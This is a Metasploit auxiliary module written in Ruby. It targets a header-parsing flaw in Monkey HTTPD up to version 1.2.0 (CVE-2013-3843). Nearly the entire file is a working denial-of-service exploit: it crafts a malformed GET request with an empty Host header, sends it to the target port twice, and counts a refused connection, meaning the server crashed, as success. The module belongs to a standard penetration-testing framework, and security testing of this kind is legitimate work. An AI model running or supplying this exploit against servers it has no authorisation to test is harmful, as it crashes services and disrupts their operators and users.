##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Headers',
			'Description'    => %q{
					Improper header parsing leads to a segmentation fault when a
				specially crafted request is sent to the server.
				Affects version <= 1.2.0.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-3843'],
				],
			'DisclosureDate' => 'May 30 2013'))

		register_options(
			[
				Opt::RPORT(2001),
			], self.class)
	end

	def run
		req = "GET / HTTP/1.1\r\n"
		req << "Host:\r\n\r\nlocalhost\r\n"
		req << "User-Agent:#{Rex::Text.rand_text_alpha(3)}\r\n\r\n"
		2.times do
			begin
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")
				sock.put(req)
				disconnect
				Rex.sleep 1
			rescue ::Rex::ConnectionRefused
				print_good("Connection Refused: Success!")
				break
			ensure
				disconnect
			end
		end
	end
end
